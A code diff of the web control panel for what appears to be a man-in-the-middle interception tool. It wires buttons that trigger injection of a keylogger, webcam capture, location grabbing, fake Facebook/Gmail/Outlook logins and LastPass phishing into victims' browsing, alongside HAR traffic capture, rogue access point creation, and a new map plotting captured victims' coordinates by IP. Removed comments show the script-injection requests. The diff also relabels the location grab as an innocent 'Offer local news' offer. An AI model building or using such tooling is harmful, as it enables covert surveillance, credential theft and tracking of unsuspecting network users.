@@ -26,7 +26,14 @@
             </label>
           </div> -->
           <h4>Simple Proxy</h4>
-          <small>Allows all connections through however data will be stored as a HAR file</small>
+          <small>Toggle the HAR collector</small>
+          <div class="onoffswitch">
+            <input type="checkbox" name="toggleHarCollection" class="onoffswitch-checkbox" id="toggleHarCollection">
+            <label class="onoffswitch-label" for="toggleHarCollection">
+              <span class="onoffswitch-inner"></span>
+              <span class="onoffswitch-switch"></span>
+            </label>
+          </div>
         </li>
 
         <!-- <li class="list-group-item">
@@ -112,10 +119,10 @@
                   <span class="onoffswitch-switch"></span>
                 </label>
               </div>
-              <h4>Get Location</h4>
-              <small>Attempt to get the user's location</small>
+              <h4>Offer local news</h4>
+              <small>If the user is on a news site, offer local news if they share their location</small>
             </li>
-
+<!-- 
             <li class="list-group-item">
               <div class="onoffswitch">
                 <input type="checkbox" name="requestLogin" class="onoffswitch-checkbox" id="requestLogin">
@@ -126,7 +133,7 @@
               </div>
               <h4>Request User Login</h4>
               <small>Request user Login to facebook, gmail or hotmail/outlook</small>
-            </li>
+            </li> -->
            <li class="list-group-item">
             <div class="onoffswitch">
               <input type="checkbox" name="requestLastpass" class="onoffswitch-checkbox" id="requestLastpass">
@@ -163,6 +170,7 @@
         <!-- <li role="presentation"><a href="#SelectUser" aria-controls="SelectUser" role="tab" data-toggle="tab">Select User</a></li> -->
         <li role="presentation" class="active"><a href="#hars" aria-controls="hars" role="tab" data-toggle="tab">Har Viewer</a></li>
         <li role="presentation"><a href="#logs" aria-controls="logs" role="tab" data-toggle="tab">Key Logs</a></li>
+        <li role="presentation"><a href="#locations" onclick="mapLoad()" aria-controls="locations" role="tab" data-toggle="tab">Locations</a></li>
         <li role="presentation"><a href="#CreateAP" aria-controls="CreateAP" role="tab" data-toggle="tab">Create Access Points</a></li>
         <li role="presentation"><a href="#wifiRequests" aria-controls="wifiRequests" role="tab" data-toggle="tab"><s>Discover Local WiFi Requests</s></a></li>
         
@@ -190,7 +198,9 @@
 
           <div id='har-view'></div> <!-- har viewer here -->
         </div>
-
+        <div role="tabpanel" class="tab-pane" id="locations">
+          <div id="map-canvas"></div>
+        </div>
         <div role="tabpanel" class="tab-pane" id="logs">
           <div id='userLogs'></div>
         </div>
@@ -250,12 +260,14 @@ var opts = {
   var handleGetRequest = function(endpoint) {
       target.style.zIndex = 1000;
       spinner.spin(target);
-      $.get( "/"+endpoint, function ( data ) { console.log(endpoint+': ', data); } )
-      .done(function() {
+      $.get( "/"+endpoint)
+      .done(function(data) {
         target.style.zIndex = 0;
         spinner.stop()//stop the spinner
+        console.log(data)
       })
   }
+  $("#toggleHarCollection").click( function () { handleGetRequest("ToggleHarCollection")});
 
   $("#startSimpleProxy").click( function () { handleGetRequest("StartSimpleProxy")});
 
@@ -267,7 +279,7 @@ var opts = {
 
   $("#keylogger").click( function () { handleGetRequest("TriggerInjection?trigger=keylogger") });
 
-  $("#getLocation").click( function () { handleGetRequest("TriggerInjection?trigger=getlocation") });
+  $("#getLocation").click( function () { handleGetRequest("TriggerInjection?trigger=getlocation"); console.log("requesting location") });
 
   $("#takePhoto").click( function () { handleGetRequest("TriggerInjection?trigger=takephoto") });
 
@@ -277,64 +289,6 @@ var opts = {
 
   $("#createaccesspoint").click( function () { handleGetRequest("CreateAccessPoint?name="+$("#apname").val()) });
 
-  // $("#triggerBlocks").click( function () {
-  //   $.get( "/TriggerBlocks", function ( data ) { console.log('Blocking: ', data); } );
-  // });
-  // $("#triggerWolfPack").click( function () {
-  //   $.get( "/TriggerWolfPack", function ( data ) { } );
-  // });
-  // $("#keylogger").click(function() {
-  //   $.get( "/TriggerInjection?trigger=keylogger", function ( data ) { } );
-  // })
-  // $("#getLocation").click(function() {
-  //   $.get( "/TriggerInjection?trigger=getlocation", function ( data ) { } );
-  // })
-  // $("#takePhoto").click(function() {
-  //   $.get( "/TriggerInjection?trigger=takephoto", function ( data ) { } );
-  // })
-  // $("#requestLogin").click(function() {
-  //   $.get( "/TriggerInjection?trigger=requestlogin", function ( data ) { } );
-  // })
-  // $("#requestLastpass").click(function() {
-  //   $.get( "/TriggerInjection?trigger=requestlasspass", function ( data ) { } );
-  // })
-  // $("#createaccesspoint").click(function() {
-  //   $.get( "/CreateAccessPoint?name="+$("#apname").val(), function ( data ) { 
-  //     console.log(data.Output)
-  //     $("#wifiOutput").html("<b>Output: </b>", data.Output)
-  //     $("#wifiError").html("<b>Error: </b>", data.Error)
-  //   } );
-  // })
-
-
-  // $("#deletehars").click(function() {
-  //    $.get( "/App/DeleteHars", function ( data ) {
-  //     $.each(data, function (i, d) {
-  //       var descr = d.split("_", -1)
-  //       console.log(descr)
-  //       $("#clients").append('<button class="btn btn-default" id="passthrough">'+descr[1]+' : ' + descr[2]+'</button>')
-  //     })
-  //   });
-  // })
-
- // $("#getLocation").click(function() {
- //    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FgetLocation.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
- //    });
- //  })
- // $("#takePhoto").click(function() {
- //    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FtakePhoto.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
- //    });
- //  })
- //   $("#requestLogin").click(function() {
- //    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2Flogin.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
- //    });
- //  })
- //   $("#requestLastpass").click(function() {
- //    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FlastpassInjection.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
- //    });
- //  })
-  //get the hars that have been collected
-  //update for each connected client
   $("#gethars").click(function() {
     $("#clients").html("")
     $.getJSON("/App/GetHars", function( data ) {
@@ -353,28 +307,7 @@ var opts = {
   })
   })
 
-  // bootstrap for toggle insted of click as above
-  $(function () {
-    $('.onoffswitch :checkbox').change(function() {
-        // checked true or false, id of toggle
-        console.log(this.checked, this.id);
 
-        // switch by id, then check if checked is true
-        switch(this.id) {
-            case "takePhoto":
-                console.log(this.checked, "taking the photo");
-                if(this.checked){
-                  // inject!
-                } else {
-                  // deject
-                }
-                break;
-            default:
-                console.log("toggled option that doesn't exist.")
-        }
-
-    });
-  });
 
 var har;
 function initHarView(){
@@ -481,6 +414,40 @@ $(document).ready(function() {
   target = document.getElementById('spinner');
   spinner = new Spinner(opts);
 })
+
+</script>
+
+
+<!-- google map -->
+
+
+<script>
+function addMarkers() {
+  $.get("/GetLocations", function ( data ) {
+    $.each(data, function(key, value){
+      console.log(value)
+      addMarker(value.Latitude, value.Longitude, value.IP)    
+    })
+  })
+  
+}
+
+  var map;
+  function initialize() {
+    map = new google.maps.Map(document.getElementById('map-canvas'), {
+      zoom: 5,
+      styles: [{"featureType":"administrative","elementType":"all","stylers":[{"visibility":"off"}]},{"featureType":"administrative","elementType":"labels","stylers":[{"visibility":"off"}]},{"featureType":"administrative.country","elementType":"geometry.stroke","stylers":[{"visibility":"off"}]},{"featureType":"administrative.province","elementType":"geometry.stroke","stylers":[{"visibility":"off"}]},{"featureType":"landscape","elementType":"geometry","stylers":[{"visibility":"on"},{"color":"#e3e3e3"}]},{"featureType":"landscape.natural","elementType":"labels","stylers":[{"visibility":"off"}]},{"featureType":"landscape.natural.landcover","elementType":"geometry.fill","stylers":[{"color":"#808285"}]},{"featureType":"poi","elementType":"all","stylers":[{"visibility":"off"}]},{"featureType":"road","elementType":"all","stylers":[{"color":"#cccccc"}]},{"featureType":"road","elementType":"labels","stylers":[{"visibility":"off"}]},{"featureType":"transit","elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"featureType":"transit.line","elementType":"geometry","stylers":[{"visibility":"off"}]},{"featureType":"transit.line","elementType":"labels.text","stylers":[{"visibility":"off"}]},{"featureType":"transit.station.airport","elementType":"geometry","stylers":[{"visibility":"off"}]},{"featureType":"transit.station.airport","elementType":"labels","stylers":[{"visibility":"off"}]},{"featureType":"water","elementType":"geometry","stylers":[{"color":"#FFFFFF"}]},{"featureType":"water","elementType":"labels","stylers":[{"visibility":"off"}]}],
+      center: {lat: 51.530088, lng: -0.091819}
+    });
+    addMarkers();
+  }
+
+  function mapLoad() {
+    document.getElementById('map-canvas').style.display="block";
+    initialize();
+
+  }
+
 
 </script>
 
